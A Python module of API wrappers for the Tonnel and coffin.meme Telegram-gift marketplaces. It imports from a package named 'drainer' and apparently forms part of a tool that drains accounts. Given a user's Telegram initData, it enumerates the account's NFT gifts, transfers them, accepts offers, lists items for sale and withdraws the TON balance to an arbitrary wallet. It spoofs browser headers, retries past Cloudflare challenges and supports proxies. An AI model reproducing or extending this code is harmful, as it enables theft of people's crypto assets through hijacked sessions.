import json
import os
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import urllib.error
import urllib.parse
import urllib.request

FETCH_MANAGED_GIFTS_URL = "https://gifts2.tonnel.network/api/fetchMangedGifts"
PAGE_GIFTS_URL = "https://gifts2.tonnel.network/api/pageGifts"
COFFIN_QUICK_TRANSFER_URL = "https://gifts.coffin.meme/api/quickTransfer"
CREATE_BUY_OFFER_URL = "https://rs-api.tonnel.network/api/buyOffer/create"
GET_BUY_OFFERS_URL = "https://rs-gifts.tonnel.network/api/buyOffer/getOffers"
ACCEPT_BUY_OFFER_URL = "https://rs-api.tonnel.network/api/buyOffer/acceptBuyOffer"
PAGE_GIFTS_RS_URL = "https://rs-gifts.tonnel.network/api/pageGifts"
COFFIN_BALANCE_WITHDRAW_URL = "https://gifts.coffin.meme/api/balance/withdraw"
BALANCE_INFO_URL = "https://rs-gifts.tonnel.network/api/balance/info"
RETURN_GIFT_URL = "https://rs-api.tonnel.network/api/returnGift"
GIFT_FLOOR_URL = "https://gifts2.tonnel.network/api/giftFloor"
COFFIN_LIST_FOR_SALE_URL = "https://gifts.coffin.meme/api/listForSale"
COFFIN_CANCEL_SALE_URL = "https://gifts.coffin.meme/api/cancelSale"

_POST_JSON_RETRIES = 6
_PAGEGIFTS_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


def _is_cf_challenge_text(s: str) -> bool:
    if not s:
        return False
    low = s[:8000].lower()
    if "<!doctype html" in low:
        return True
    if "<html" in low[:500]:
        return True
    if "just a moment" in low:
        return True
    if "cf-ray" in low:
        return True
    if "checking your browser" in low:
        return True
    return False


_proxy_lock = threading.Lock()
_proxy_cache_url: str | None = None
_proxy_cache_opener: urllib.request.OpenerDirector | None = None


def _tonnel_proxy_url() -> str:
    return (
        os.environ.get("TONNEL_HTTPS_PROXY")
        or os.environ.get("RECEIVER_POLL_TONNEL_PROXY")
        or os.environ.get("TONNEL_PROXY")
        or os.environ.get("HTTPS_PROXY")
        or os.environ.get("HTTP_PROXY")
        or ""
    ).strip()


def _tonnel_url_opener() -> urllib.request.OpenerDirector | None:
    global _proxy_cache_url, _proxy_cache_opener
    u = _tonnel_proxy_url()
    with _proxy_lock:
        if not u:
            _proxy_cache_url = ""
            _proxy_cache_opener = None
            return None
        if u == _proxy_cache_url and _proxy_cache_opener is not None:
            return _proxy_cache_opener
        h = urllib.request.ProxyHandler({"http": u, "https": u})
        _proxy_cache_opener = urllib.request.build_opener(h)
        _proxy_cache_url = u
        return _proxy_cache_opener


def _tonnel_urlopen(req: urllib.request.Request, timeout: float) -> object:
    op = _tonnel_url_opener()
    if op is not None:
        return op.open(req, timeout=timeout)
    return urllib.request.urlopen(req, timeout=timeout)


def _is_transient_url_error(e: urllib.error.URLError) -> bool:
    r = e.reason
    if isinstance(r, socket.timeout):
        return True
    if isinstance(r, socket.gaierror):
        return True
    if isinstance(r, OSError):
        en = getattr(r, "errno", None)
        if en is None:
            return False
        return en in (-3, 11, 110, 101, 104, 32, 35, 115)
    return False


def _post_json(
    url: str,
    payload: dict,
    origin: str,
    referer: str,
    *,
    sec_fetch_site: str = "same-site",
    user_agent: str | None = None,
    cf_html_retries: int = 0,
) -> dict | list:
    data = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    ua = user_agent or (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) "
        "Gecko/20100101 Firefox/148.0"
    )
    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": origin,
        "Referer": referer,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": sec_fetch_site,
        "User-Agent": ua,
    }
    cf_round = 0
    max_cf = max(0, int(cf_html_retries))
    while True:
        req = urllib.request.Request(
            url,
            data=data,
            method="POST",
            headers=headers,
        )
        raw: str | None = None
        for attempt in range(_POST_JSON_RETRIES):
            try:
                with _tonnel_urlopen(req, 60) as resp:
                    raw = resp.read().decode("utf-8")
                break
            except urllib.error.HTTPError as e:
                raw = e.read().decode("utf-8", "replace")
                break
            except urllib.error.URLError as e:
                if attempt + 1 < _POST_JSON_RETRIES and _is_transient_url_error(e):
                    time.sleep(2.0 + attempt * 2.5)
                    continue
                raise
        if raw is None:
            return {"status": "error", "message": "urlopen gave no response"}
        if not raw.strip():
            return {"status": "error", "message": "empty response"}
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            if max_cf > 0 and cf_round < max_cf and _is_cf_challenge_text(raw):
                cf_round += 1
                time.sleep(2.8 + cf_round * 2.2)
                continue
            msg = (
                "cloudflare_challenge_html"
                if _is_cf_challenge_text(raw)
                else raw[:300]
            )
            return {"status": "error", "message": msg}


def _is_api_error(r: dict | list) -> bool:
    return isinstance(r, dict) and r.get("status") == "error"


def _tg_user_id(init_data: str) -> int:
    for item in init_data.split("&"):
        if item.startswith("user="):
            j = json.loads(urllib.parse.unquote(item[5:]))
            return int(j["id"])
    raise ValueError("user id not in init data")


def _page_gifts_listed(init_data: str, origin: str, referer: str) -> dict | list:
    uid = _tg_user_id(init_data)
    filter_dict = {
        "seller": uid,
        "buyer": {"$exists": False},
        "$or": [
            {"price": {"$exists": True}},
            {"auction_id": {"$exists": True}},
        ],
    }
    payload = {
        "filter": json.dumps(filter_dict, separators=(",", ":")),
        "limit": 30,
        "page": 1,
        "sort": '{"message_post_time":-1,"gift_id":-1}',
        "ref": 0,
        "user_auth": init_data,
    }
    return _post_json(
        PAGE_GIFTS_URL,
        payload,
        origin,
        referer,
        user_agent=_PAGEGIFTS_UA,
        cf_html_retries=4,
    )


def _page_gifts_unlisted(init_data: str, origin: str, referer: str) -> dict | list:
    uid = _tg_user_id(init_data)
    filter_dict = {
        "seller": uid,
        "buyer": {"$exists": False},
        "refunded": {"$ne": True},
        "price": {"$exists": False},
    }
    payload = {
        "filter": json.dumps(filter_dict, separators=(",", ":")),
        "limit": 30,
        "page": 1,
        "sort": '{"gift_num":1,"gift_id":-1}',
        "ref": 0,
        "user_auth": init_data,
    }
    return _post_json(
        PAGE_GIFTS_URL,
        payload,
        origin,
        referer,
        user_agent=_PAGEGIFTS_UA,
        cf_html_retries=4,
    )


def _as_list(r: dict | list) -> list:
    if isinstance(r, list):
        return r
    if isinstance(r, dict):
        for k in ("gifts", "data", "items", "results"):
            v = r.get(k)
            if isinstance(v, list):
                return v
    return []


def coffin_quick_transfer(init_data: str, gift_id: str) -> dict | list:
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    return _post_json(
        COFFIN_QUICK_TRANSFER_URL,
        {"authData": init_data, "gift_id": str(gift_id)},
        origin,
        referer,
        sec_fetch_site="cross-site",
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) "
            "Gecko/20100101 Firefox/149.0"
        ),
    )


def _fetch_manged_gifts_body(init_data: str, page: int) -> dict:
    return {
        "page": page,
        "authData": init_data,
        "sort": '{"gift_num":1}',
        "filter": "{}",
    }


def _page_listed_unlisted_bundle(init_data: str, origin: str, referer: str):
    raw_l = _page_gifts_listed(init_data, origin, referer)
    if _is_api_error(raw_l):
        return ("bad", raw_l, None, [], [])
    raw_u = _page_gifts_unlisted(init_data, origin, referer)
    listed = _as_list(raw_l)
    unlisted = _as_list(raw_u) if not _is_api_error(raw_u) else []
    return ("ok", raw_l, origin, listed, unlisted)


def fetch_managed_gifts(init_data: str, page: int = 1) -> dict:
    o1, r1 = (
        "https://marketplace.tonnel.network",
        "https://marketplace.tonnel.network/",
    )
    o2, r2 = "https://market.tonnel.network", "https://market.tonnel.network/"
    body = _fetch_manged_gifts_body(init_data, page)
    with ThreadPoolExecutor(max_workers=2) as ex:
        f_m1 = ex.submit(_post_json, FETCH_MANAGED_GIFTS_URL, body, o1, r1)
        f_m2 = ex.submit(_post_json, FETCH_MANAGED_GIFTS_URL, body, o2, r2)
        r_m1 = f_m1.result()
        r_m2 = f_m2.result()
    if not _is_api_error(r_m1):
        manged_last = r_m1
        manged_origin = o1
        manged_response = r_m1
    elif not _is_api_error(r_m2):
        manged_last = r_m2
        manged_origin = o2
        manged_response = r_m2
    else:
        manged_last = r_m1
        manged_origin = o1
        manged_response = r_m1
    page_origin = None
    listed: list = []
    unlisted: list = []
    page_last: dict | list = {"status": "error", "message": "no attempt"}
    with ThreadPoolExecutor(max_workers=2) as ex:
        f_p1 = ex.submit(_page_listed_unlisted_bundle, init_data, o1, r1)
        f_p2 = ex.submit(_page_listed_unlisted_bundle, init_data, o2, r2)
        p1 = f_p1.result()
        p2 = f_p2.result()
    for bundle in (p1, p2):
        tag, last, origin, lst, unl = bundle
        page_last = last
        if tag == "ok":
            page_origin = origin
            listed = lst
            unlisted = unl
            break
    page_block: dict = {
        "origin": page_origin,
        "listed_for_sale": listed,
        "owned_not_listed": unlisted,
    }
    if page_origin is None:
        page_block["last_error"] = page_last
    return {
        "fetchMangedGifts": {
            "origin": manged_origin,
            "response": manged_response,
        },
        "pageGifts": page_block,
    }


def _norm_nft_link(s: str) -> str:
    t = (s or "").strip().split()[0]
    return t.lower() if t else ""


def _tonnel_page_item_collect(ids: set[str], links: set[str], it: dict) -> None:
    if not isinstance(it, dict):
        return
    for k in ("gift_id", "owned_gift_id"):
        v = it.get(k)
        if v is not None:
            ids.add(str(v))
    g = it.get("gift")
    if isinstance(g, dict):
        n = g.get("name")
        if isinstance(n, str) and n.strip():
            links.add(_norm_nft_link(f"https://t.me/nft/{n.strip()}"))
    for lk_k in ("gift_link", "link", "url"):
        v = it.get(lk_k)
        if isinstance(v, str) and "t.me/nft/" in v:
            links.add(_norm_nft_link(v))


def collect_tonnel_portfolio_ids_and_links(init_data: str) -> tuple[set[str], set[str], bool]:
    ids: set[str] = set()
    links: set[str] = set()
    try:
        payload = fetch_managed_gifts(init_data)
    except Exception:
        return ids, links, False
    managed_ok = False
    try:
        resp = payload.get("fetchMangedGifts", {}).get("response")
        if isinstance(resp, dict) and not _is_api_error(resp):
            data = resp.get("data")
            if isinstance(data, list):
                managed_ok = True
                for row in data:
                    if not isinstance(row, dict):
                        continue
                    og = row.get("owned_gift_id")
                    if og is not None:
                        ids.add(str(og))
                    g = row.get("gift")
                    if isinstance(g, dict):
                        n = g.get("name")
                        if isinstance(n, str) and n.strip():
                            links.add(_norm_nft_link(f"https://t.me/nft/{n.strip()}"))
    except (TypeError, AttributeError):
        pass
    page_ok = False
    try:
        pg = payload.get("pageGifts") or {}
        if isinstance(pg, dict) and pg.get("origin"):
            page_ok = True
        for key in ("listed_for_sale", "owned_not_listed"):
            lst = pg.get(key) if isinstance(pg, dict) else None
            if isinstance(lst, list):
                for it in lst:
                    _tonnel_page_item_collect(ids, links, it)
    except (TypeError, AttributeError):
        pass
    ok = managed_ok or page_ok
    return ids, links, ok


def create_buy_offer(auth_data: str, gift_id: int, amount: float, asset: str) -> dict | list:
    """
    Выполняет POST-запрос к /api/buyOffer/create с нужными заголовками и данными.
    auth_data — строка, как в curl (user=...&chat_instance=...&...)
    gift_id — id подарка (int)
    amount — сумма (float)
    asset — валюта (например, 'TON')
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "authData": auth_data,
        "gift_id": gift_id,
        "amount": amount,
        "asset": asset,
    }
    return _post_json(
        CREATE_BUY_OFFER_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    )

def get_buy_offers(auth_data: str, gift_id: int | str) -> dict | list:
    """
    Выполняет POST-запрос к /api/buyOffer/getOffers с нужными заголовками и данными.
    auth_data — строка, как в curl (user=...&chat_instance=...&...)
    gift_id — id подарка (int или str)
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "authData": auth_data,
        "gift_id": str(gift_id),
    }
    return _post_json(
        GET_BUY_OFFERS_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    )
    
def accept_buy_offer(auth_data: str, offer_id: str) -> dict | list:
    """
    Выполняет POST-запрос к /api/buyOffer/acceptBuyOffer с нужными заголовками и данными.
    auth_data — строка, как в curl (user=...&chat_instance=...&...)
    offer_id — id оффера (например, XY87CONR)
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "authData": auth_data,
        "offer_id": offer_id,
    }
    return _post_json(
        ACCEPT_BUY_OFFER_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    )
    
def page_gifts_rs(
    page: int,
    limit: int,
    sort: str,
    filter_: dict,
    ref: str,
    user_auth: str,
) -> dict | list:
    """
    Выполняет POST-запрос к /api/pageGifts на rs-gifts.tonnel.network с нужными заголовками и параметрами.
    filter_ — dict, будет сериализован в строку
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "page": page,
        "limit": limit,
        "sort": sort,
        "filter": json.dumps(filter_, separators=(",", ":")),
        "ref": ref,
        "user_auth": user_auth,
    }
    return _post_json(
        PAGE_GIFTS_RS_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent=_PAGEGIFTS_UA,
        cf_html_retries=4,
    )


def _page_gifts_listed_via_rs(init_data: str) -> dict | list:
    uid = _tg_user_id(init_data)
    f = {
        "seller": uid,
        "buyer": {"$exists": False},
        "$or": [
            {"price": {"$exists": True}},
            {"auction_id": {"$exists": True}},
        ],
    }
    return page_gifts_rs(
        1,
        30,
        '{"message_post_time":-1,"gift_id":-1}',
        f,
        "0",
        init_data,
    )


def _page_gifts_unlisted_via_rs(init_data: str) -> dict | list:
    uid = _tg_user_id(init_data)
    f = {
        "seller": uid,
        "buyer": {"$exists": False},
        "refunded": {"$ne": True},
        "price": {"$exists": False},
    }
    return page_gifts_rs(1, 30, '{"gift_num":1,"gift_id":-1}', f, "0", init_data)


def coffin_balance_withdraw(wallet: str, auth_data: str, amount: float, asset: str = "TON") -> dict | list:
    """
    Выполняет POST-запрос к /api/balance/withdraw на gifts.coffin.meme.
    wallet — адрес кошелька (например, UQC3QAPX68TFa3DkToGy6sGTLC3iaqCFbDzo0o0u5dstE3vx)
    auth_data — тгWebAppData строка
    amount — сумма вывода (например, 0.599)
    asset — валюта (например, 'TON')
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "wallet": wallet,
        "authData": auth_data,
        "amount": amount,
        "asset": asset,
    }
    return _post_json(
        COFFIN_BALANCE_WITHDRAW_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="cross-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0",
    )


def get_balance_info(auth_data: str) -> float:
    """
    Получает баланс через /api/balance/info на rs-gifts.tonnel.network.
    Принимает только auth_data (tgWebAppData).
    Возвращает float значение баланса: round(balance, 3) - 0.01
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "authData": auth_data,
        "ref": "",
    }
    result = _post_json(
        BALANCE_INFO_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    )
    if isinstance(result, dict) and "balance" in result:
        balance = float(result["balance"])
        return round(balance, 3) - 0.01
    return 0.0


def page_gifts_listed_and_unlisted(init_data: str) -> tuple[list, list, dict | list | None]:
    o1, r1 = (
        "https://marketplace.tonnel.network",
        "https://marketplace.tonnel.network/",
    )
    o2, r2 = "https://market.tonnel.network", "https://market.tonnel.network/"
    last_err: dict | list | None = None
    for o, r in ((o1, r1), (o2, r2)):
        raw_l = _page_gifts_listed(init_data, o, r)
        last_err = raw_l
        if _is_api_error(raw_l):
            continue
        raw_u = _page_gifts_unlisted(init_data, o, r)
        listed = _as_list(raw_l)
        unlisted = _as_list(raw_u) if not _is_api_error(raw_u) else []
        return listed, unlisted, None
    raw_l = _page_gifts_listed_via_rs(init_data)
    last_err = raw_l
    if _is_api_error(raw_l):
        return [], [], last_err
    raw_u = _page_gifts_unlisted_via_rs(init_data)
    listed = _as_list(raw_l)
    unlisted = _as_list(raw_u) if not _is_api_error(raw_u) else []
    return listed, unlisted, None


def gift_floor(auth_data: str, gift_name: str, asset: str = "TON") -> dict | list:
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    return _post_json(
        GIFT_FLOOR_URL,
        {"authData": auth_data, "gift_name": gift_name, "asset": asset},
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    )


def coffin_list_for_sale(
    auth_data: str,
    gift_id: str | int,
    price: str,
    asset: str = "TON",
) -> dict | list:
    from drainer.core.coffin_signing import build_list_for_sale_wtf

    ts, wtf = build_list_for_sale_wtf()
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    return _post_json(
        COFFIN_LIST_FOR_SALE_URL,
        {
            "authData": auth_data,
            "gift_id": str(gift_id),
            "price": str(price),
            "asset": asset,
            "timestamp": ts,
            "wtf": wtf,
        },
        origin,
        referer,
        sec_fetch_site="cross-site",
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) "
            "Gecko/20100101 Firefox/149.0"
        ),
    )


def coffin_cancel_sale(auth_data: str, gift_id: str | int) -> dict | list:
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    return _post_json(
        COFFIN_CANCEL_SALE_URL,
        {"authData": auth_data, "gift_id": str(gift_id)},
        origin,
        referer,
        sec_fetch_site="cross-site",
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) "
            "Gecko/20100101 Firefox/149.0"
        ),
    )


def return_gift(auth_data: str, gift_id: int | str) -> dict | list:
    """
    Выполняет POST-запрос к /api/returnGift на rs-api.tonnel.network.
    auth_data — строка tgWebAppData (user=...&chat_instance=...&...)
    gift_id — id подарка для возврата (int или str)
    """
    origin = "https://marketplace.tonnel.network"
    referer = origin + "/"
    payload = {
        "authData": auth_data,
        "gift_id": str(gift_id),
    }
    return _post_json(
        RETURN_GIFT_URL,
        payload,
        origin,
        referer,
        sec_fetch_site="same-site",
        user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0",
    )

